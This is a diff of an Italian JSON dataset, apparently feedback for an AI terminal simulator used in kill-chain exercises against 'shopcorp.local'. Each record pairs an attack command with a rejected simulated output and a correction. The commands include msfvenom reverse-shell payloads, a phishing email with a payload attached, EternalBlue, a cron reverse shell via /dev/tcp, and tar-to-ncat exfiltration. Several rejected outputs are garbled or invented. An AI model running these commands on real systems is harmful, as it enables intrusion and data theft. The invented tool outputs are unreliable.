@@ -20,7 +20,6 @@
     "motivo": "L'output deve riportare campi reali tipici di whois (Domain Name, Registrar, Name Server, ecc.), non un riassunto generico.",
     "timestamp": "2025-07-04T14:02:01.000000"
   },
-
   {
     "fase": "weaponization",
     "comando": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -f elf -o payload.elf",
@@ -35,7 +34,6 @@
     "motivo": "L'output deve confermare in modo chiaro e conciso che il setup del database è stato completato, come '[*] Database setup complete.'",
     "timestamp": "2025-07-04T14:05:01.000000"
   },
-
   {
     "fase": "delivery",
     "comando": "scp payload.elf mario.rossi@shopcorp.local:/tmp",
@@ -57,7 +55,6 @@
     "motivo": "L'output deve mostrare dettagli del trasferimento come fa smbclient (nome share, OS, nome file, velocità), non solo una frase generica.",
     "timestamp": "2025-07-04T14:08:01.000000"
   },
-
   {
     "fase": "exploit",
     "comando": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.10.10.20; set LPORT 4444; exploit'",
@@ -79,7 +76,6 @@
     "motivo": "L'output deve mostrare, come fa hydra, il servizio, host, username e la password trovata, in formato tabellare o ben strutturato.",
     "timestamp": "2025-07-04T14:11:01.000000"
   },
-
   {
     "fase": "installation",
     "comando": "ssh mario.rossi@shopcorp.local",
@@ -101,7 +97,6 @@
     "motivo": "L'output deve mostrare la creazione del symlink come nel messaggio reale di systemctl (ad esempio: Created symlink ...).",
     "timestamp": "2025-07-04T14:14:01.000000"
   },
-
   {
     "fase": "command_and_control",
     "comando": "nc -lvp 4444",
@@ -123,7 +118,6 @@
     "motivo": "L'output deve specificare che il tunnel reverse è attivo, indicando le porte coinvolte e la destinazione, non solo una frase sintetica.",
     "timestamp": "2025-07-04T14:17:01.000000"
   },
-
   {
     "fase": "actions_on_objectives",
     "comando": "tar czf secrets.tar.gz /etc/secret",
@@ -144,5 +138,138 @@
     "output_sbagliato": "Transfer complete.",
     "motivo": "L'output deve simulare la barra di avanzamento reale di scp, con nome file, percentuale, velocità, tempo, non solo una frase finale.",
     "timestamp": "2025-07-04T14:20:01.000000"
+  },
+  {
+    "fase": "weaponization",
+    "comando": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.1 LPORT=8080 -f exe -o payload.exe",
+    "output_sbagliato": "______________________________________________________________________ \n\n  MsfVenom (Payload generator)                                      \n\n  Copyright 2007-2014 by Rapid7                                      \n\n  ______________________________________________________________________ \n\n  Options : \n  Name (no extension)                     : payload \n  Class                                : windows \n  Function                             : meterpreter/reverse_tcp \n  OutFile                              : payload.exe \n  EncodeString                         : false \n  MaxLength                            : 10000 \n  IncreaseAlignment                   : false \n  EnableNops                           : false \n  NopMessage                           : '' \n  AddDllInjection                    : false \n  AddProcessInjection                  : false \n  AddThreadInjection                  : false \n  ROPchain                             : no \n  RunAs                                 :",
+    "motivo": "L'output generato è troppo dettagliato e non rappresenta il comportamento reale di msfvenom da terminale. L'output reale mostra solo la dimensione del payload, la dimensione finale dell'eseguibile e la conferma del file salvato, senza elencare le opzioni interne.",
+    "timestamp": "2025-07-07T22:10:37.902406"
+  },
+  {
+    "fase": "weaponization",
+    "comando": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.1 LPORT=8080 -f exe -o payload.exe",
+    "output_sbagliato": "Length of the payload : 4624\nGenerated 4624 bytes of payload, could be trimmed to 4352\nFile payload.exe saved.",
+    "motivo": "L’output generato non è conforme a quello reale di msfvenom: la CLI mostra una sintesi simile a:\n\nNo platform was selected, choosing Msf::Module::Platform::<PLATFORM> from the payload\nNo arch selected, selecting arch:<ARCH> from the payload\nNo encoder specified, outputting raw payload\nPayload size:  <DIMENSIONE> bytes\nFinal size of <formato> file: <DIMENSIONE_FINALE> bytes\nSaved as:<NOME_FILE>\n\nAssicurati di riportare solo i messaggi standard della CLI msfvenom: Payload size, Final size of exe file, Saved as. Non aggiungere altri messaggi o dettagli non presenti nel tool reale.",
+    "timestamp": "2025-07-07T22:15:26.161169"
+  },
+  {
+    "fase": "delivery",
+    "comando": "sendEmail -f noreply@attacker.local -t info@shopcorp.local -u \"Richiesta documento\" -m \"Vedi Allegato\" -a payload.exe -s smtp.attacker.local:25`",
+    "output_sbagliato": "sendemail: could not resolve: smtp.attacker.local \nsendemail: failed to send mail the message and may of its parts were left on file. type'sendemail -h' for help on using the unsent set.  \nMail (unsent) to 'info@shopcorp.local' in file /var/mail/unsent 1  (payload.exe attached)  (text of message is'vedi allegato\\r\\n\\r\\n') (mail from: noreply@attacker.local)  (mail subject: richiesta documento)  (attachment: payload.exe)  (may be sent with sendemail -A unsent)",
+    "motivo": "In simulazione, per la fase delivery, si preferisce mostrare l’output di successo (“Email sent successfully”) e non l’errore di mancata risoluzione del server SMTP.",
+    "timestamp": "2025-07-07T23:02:35.294966"
+  },
+  {
+    "fase": "exploit",
+    "comando": "msfconsole -q -x use exploit/smb/ms17_010_eternalblue; set RHOST shopcorp.local; set LHOST 10.0.2.1; set LPORT 8080; exploit",
+    "output_sbagliato": "msf5 > use exploit/smb/ms17_010_eternalblue \nmsf5 exploit(smb/ms17_010_eternalblue) > set RHOST shopcorp.local \nRHOST => shopcorp.local \nmsf5 exploit(smb/ms17_010_eternalblue) > set LHOST 10.0.2.1 \nLHOST => 10.0.2.1 \nmsf5 exploit(smb/ms17_010_eternalblue) > set LPORT 8080 \nLPORT => 8080 \nmsf5 exploit(smb/ms17_010_eternalblue) > exploit \n[*] Started reverse TCP handler on 10.0.2.1:8080 \n[*",
+    "motivo": "struttura dell'output corretto:\nmsf5 > use exploit/smb/ms17_010_eternalblue\nmsf5 exploit(smb/ms17_010_eternalblue) > set RHOST shopcorp.local\nRHOST => shopcorp.local\nmsf5 exploit(smb/ms17_010_eternalblue) > set LHOST 10.0.2.1\nLHOST => 10.0.2.1\nmsf5 exploit(smb/ms17_010_eternalblue) > set LPORT 8080\nLPORT => 8080\nmsf5 exploit(smb/ms17_010_eternalblue) > exploit\n[*] Started reverse TCP handler on 10.0.2.1:8080\n[*] shopcorp.local:445 - Sending exploit packet\n[*] Sending stage (<PAYLOAD_SIZE> bytes) to shopcorp.local\n[*] Meterpreter session <ID> opened (10.0.2.1:8080 -> <TARGET_IP>:<TARGET_PORT>) at <TIMESTAMP>\n\nmeterpreter >",
+    "timestamp": "2025-07-07T23:44:06.230126"
+  },
+  {
+    "fase": "installation",
+    "comando": "sudo (crontab -l; echo \"*/5 * * * * /bin/bash -i >& /dev/tcp/10.0.2.1/8080 0>&1\") | crontab",
+    "output_sbagliato": "[sudo] password for ubuntu: \n\nError in crontab input, will not be saved \n\n (job)         (* * * * *   /bin/bash -i >& /dev/tcp/10.0.2.1/8080 0>&1)  <non-numeric> at end of line",
+    "motivo": "Quando il comando per aggiungere un job cron va a buon fine, non deve essere restituito nessun output (salvo eventuale richiesta della password per sudo).\nSe il comando contiene errori di sintassi, allora cron restituirà un messaggio di errore; altrimenti, il comportamento reale è il silenzio.",
+    "timestamp": "2025-07-08T00:47:31.158326"
+  },
+  {
+    "fase": "installation",
+    "comando": "sudo (crontab -l; echo \"*/5 * * * * /bin/bash -i >& /dev/tcp/10.0.2.1/8080 0>&1\") | crontab",
+    "output_sbagliato": "sudo password for ubuntu:  â˜•ï¸ â¤ï¸ <hidden> â˜•ï¸ â¤ï¸ : â˜•ï¸� ): â¤ï¸ <hidden> â¤ï¸  â˜•ï¸ â¤ï¸  â˜•ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  (error can only be set by user in their own crontab)  â˜•ï¸ â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸  â¤ï¸",
+    "motivo": "restituisci solo 'sudo password for ubuntu' se il comando ricevuto è effettuato con \"sudo\"",
+    "timestamp": "2025-07-08T00:49:54.752479"
+  },
+  {
+    "fase": "command_and_control",
+    "comando": "ncat --ssl --keep-open --listen 8080",
+    "output_sbagliato": "listening on [af:10] 0.0.0.0:8080... \n\n \nWaiting for connections....",
+    "motivo": "Il listener si mette in attesa sulla porta 8080, pronto a ricevere connessioni.\nPuoi anche usare la variante “Ncat: Listening on 0.0.0.0:8080”",
+    "timestamp": "2025-07-08T00:58:38.036109"
+  },
+  {
+    "fase": "command_and_control",
+    "comando": "ncat --ssl --keep-open --listen 8080",
+    "output_sbagliato": "Ncat: Listening on 0.0.0.0:8080",
+    "motivo": "Genera l’output come se la connessione avvenisse subito dopo il comando di listening, mostrando entrambi i messaggi uno dopo l’altro (apertura listener e ricezione connessione).",
+    "timestamp": "2025-07-08T01:01:00.837864"
+  },
+  {
+    "fase": "command_and_control",
+    "comando": "ncat --ssl --keep-open --listen 8080",
+    "output_sbagliato": "Ncat: Listening on 0.0.0.0:8080 \nConnected by 127.0.0.1 at 1635079213  [type:ssh  raddr:127.0.0.1 rport:53434 t+r:- ]",
+    "motivo": "devi generare sia il messaggio di messa in ascolto che la ricezione di una connessione nello stesso output.",
+    "timestamp": "2025-07-08T01:01:32.728525"
+  },
+  {
+    "fase": "command_and_control",
+    "comando": "ncat --ssl --keep-open --listen 8080",
+    "output_sbagliato": "Ncat: Listening on 0.0.0.0:8080 \nConnection from 127.0.0.1 4524 timewait etabloshed",
+    "motivo": "devi generare sia il messaggio di messa in ascolto che la ricezione di una connessione nello stesso output.\nEsempio:\"Ncat: Connection from <IP>:<porta>.\"",
+    "timestamp": "2025-07-08T01:02:52.854502"
+  },
+  {
+    "fase": "actions_on_objectives",
+    "comando": "tar -czf - /root/exfiltrated_data/* | ncat --ssl 10.0.2.1 8080",
+    "output_sbagliato": "tar: /root/exfiltrated_data/: Not found\ntar: Child returned status 1\nncat: could not bind socket for 10.0.2.1:8080, err=(113)No connection could be made because the target machine actively refused it.",
+    "motivo": "Questo comando non deve restituire NESSUN OUTPUT, deve essere vuoto",
+    "timestamp": "2025-07-08T01:20:03.747456"
+  },
+  {
+    "fase": "actions_on_objectives",
+    "comando": "tar -czf - /root/exfiltrated_data/* | ncat --ssl 10.0.2.1 8080",
+    "output_sbagliato": "tar: /root/exfiltrated_data/: failed to write archive entry \ntar: Child returned status 1 \ntar: Error is not severe enough for tar to report it as its exit status 1 \n        \n^C",
+    "motivo": "NON devi generare nessun output: il comando, se va a buon fine, esegue in silenzio senza stampare nulla su terminale.\nDevi quindi lasciare vuota la risposta",
+    "timestamp": "2025-07-08T01:22:12.185529"
+  },
+  {
+    "fase": "weaponization",
+    "comando": "msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.100 LPORT=443 -o payload.php",
+    "output_sbagliato": "'class' => 'psh_payload', 'compressor' => '', 'encoder' =>  '', 'platform'' => 'php', 'rank' => 'excellent', 'type' => 'payload','vectors' => '', 'arch' => NULL, 'align_diff' => NULL, 'bad_bytes' => False, 'bad_chops' => False, 'callhome' => True, 'compile_all' => False, 'disable_nopad' => False, 'enable_stage1_encoder' => False, 'error_format' => 'r', 'evasion' => '', 'good_byte' => '\\x90', 'increment_register' => 'eax','max_size' => 1048576, 'only_desktop' => False, 'pre' => '', 'post' => '', 'pre_cmd' => '', 'post_exp' => '', 'rand_add' => False,'remove_comments' => False,'show_offset' => False,'shellfound' => False,'show_diff' => False,'single_stockpile' => False,'stage_encoding' => '','stock' =>'single', 'target_arch' => 'php', 'use_mfs' => False, 'use_full_eip' => True, 'yen_offset' => 172, 'bad_char' => '\\x9,\\x80\\x160\\x1f\\x98\\xff\\x0a\\x85\\xda\\x06",
+    "motivo": "L’output non è quello che realmente genera il comando msfvenom. Un output reale di msfvenom mostra informazioni concise come la dimensione del payload, eventuali avvisi, e il nome del file creato. Non mostra dettagli tecnici su campi interni di payload, architettura o parametri interni del framework.",
+    "timestamp": "2025-07-08T16:39:15.728738"
+  },
+  {
+    "fase": "weaponization",
+    "comando": "msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.100 LPORT=443 -o payload.php",
+    "output_sbagliato": "No platform was selected, choosing Msf::Module::Platform::php from the payload\nPayload size: 714 bytes\nFinal size of php file: 751 bytes\nSaved as: payload.php",
+    "motivo": "struttura corretta:\nNo platform was selected, choosing Msf::Module::Platform::PHP from the payload\nNo arch selected, selecting arch: php from the payload\nNo encoder specified, outputting raw payload\nPayload size: <N> bytes\nSaved as: <NOME_FILE>",
+    "timestamp": "2025-07-08T16:56:43.495102"
+  },
+  {
+    "fase": "delivery",
+    "comando": "scp payload.php user1.email@shopcorp.local:/home/user1/email/phish/",
+    "output_sbagliato": "ssh://RSA \nAre you sure you want to run this? (y/n)",
+    "motivo": "user1.email@shopcorp.local's password: \npayload.php                                100% 1116    2.2KB/s   00:00",
+    "timestamp": "2025-07-08T17:36:31.230470"
+  },
+  {
+    "fase": "exploit",
+    "comando": "msfconsole -q -x use multi/handler; set payload php/meterpreter_reverse_tcp; set LHOST 10.0.2.100; set LPORT 443; exploit -z`",
+    "output_sbagliato": "msf5 > use multi/handler \nModule followed; Set followframe; Disable followfried; Following a single stream by default \nmsf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp \npayload => php/meterpreter_reverse_tcp \nmsf5 exploit(multi/handler) > set lhost 10.0.2.100 \nlhost => 10.0.2.100 \nmsf5 exploit(multi/handler) > set lport 443 \nlport => 443 \nmsf5 exploit(multi/handler) > exploit -z \n\n[*] Starting the multi-handler \n[*] Started reverse TCP handler on 10.0.2.100:443 \n[*] 10.0.2.100:443 is now accepting connections (waited for thread to come alive). Ready to receive and execute commands. \n[*] Server started. To stop repeat'stop' at the prompt.",
+    "motivo": "dopo:\" [*] Started reverse TCP handler on 10.0.2.100:443\" simula la connessione avvenuta dalla vittima\n\"[*] Sending stage (37775 bytes) to <IP_vittima>\n[*] Meterpreter session 1 opened (10.0.2.100:443 -> <IP_vittima>:xxxx) at 2025-07-xx xx:xx:xx +0000\nmeterpreter >\"",
+    "timestamp": "2025-07-08T18:13:03.953489"
+  },
+  {
+    "fase": "exploit",
+    "comando": "msfconsole -q -x use multi/handler; set payload php/meterpreter_reverse_tcp; set LHOST 10.0.2.100; set LPORT 443; exploit -z`",
+    "output_sbagliato": "msf5 > use multi/handler \nUse Expenseable Module (multi/handler): True \nModule name # of portbindings of the module DefaultHost DefaultPort \nmulti/handler    15     0.0.0.0   4444 \n\nmsf5 multi/handler > set payload php/meterpreter_reverse_tcp \npayload => php/meterpreter_reverse_tcp \n\nmsf5 multi/handler > set LHOST 10.0.2.100 \nLHOST => 10.0.2.100 \n\nmsf5 multi/handler > set LPORT 443 \nLPORT => 443 \n\nmsf5 multi/handler > exploit -z \n[*] Started reverse TCP handler on 10.0.2.100:443 \n[*] 10.0.0.100:56789 is from an untrusted network and has a low confidence level. Consider setting Netrapid to 'true' to block this connection. \n[*] Sending stage (37775 bytes) to 10.0.0.100 \n[*] Meterpreter session 1 opened (10.0.2.100:443 -> 10.0.0.100:56789) at 2023-09-18 14:42:16 +0000 \nmeterpreter >",
+    "motivo": "non mostrare queste righe nell' output:\n\"Use Expenseable Module (multi/handler): True \nModule name # of portbindings of the module DefaultHost DefaultPort \nmulti/handler    15     0.0.0.0   4444 \"\n\"[*] 10.0.0.100:56789 is from an untrusted network and has a low confidence level. Consider setting Netrapid to 'true' to block this connection.\"",
+    "timestamp": "2025-07-08T18:16:59.589551"
+  },
+  {
+    "fase": "exploit",
+    "comando": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.2.1; set LPORT 443; exploit\"",
+    "output_sbagliato": "MSF console (MetroFTP) > \nuse needed for set/\nNo payload specified, default to windows/meterpreter/reverse_tcp.\nPayload set for server, to windows/x64/meterpreter/reverse_tcp \nExpanded to http handler for http\nHandler expanded into a Meterpreter Local (rconnect) based E\nHandler v1.2 starting \nServer started.  Listening for in-bound connections on 10.0.0.0:443 \nMSF console (MetroFTP) >",
+    "motivo": "a",
+    "timestamp": "2025-07-08T21:06:14.523089"
+  },
+  {
+    "fase": "exploit",
+    "comando": "run persistence -X -i 10 -p 443 -r 10.0.2.1",
+    "output_sbagliato": "Starting nmap 7.92 ( https://nmap.org ) at 2023-03-15 14:30 IT \n\nSending 10 'connect' to 10.0.2.1[10.0.2.1] on port 443 Timed out (10 second(s)) \n\nSending 10 'connect' to 10.0.2.1[10.0.2.1] on port 443 succeeded! \n\nTiming: MS 100000  (ms res, sadtotcms 10000) rtt-min/mav/max/std = 1.00/1.01/1.02/0.02  hosts try-srv/best/worst/first/last = 1/1/1/1/1 \n\nNmap done: 1 IP address (1 host up) scanned in 11.05 seconds (after timer end).",
+    "motivo": "la struttura del comando corretto è:\n[*] Creating a persistent agent: LHOST=<LHOST> LPORT=<LPORT> (interval=<INTERVAL> onboot=true)\n[*] Persistent agent script is <DIMENSIONE> bytes long and written to <PERCORSO_SCRIPT>\n[*] Agent executed successfully.",
+    "timestamp": "2025-07-08T21:23:53.121504"
   }
 ]
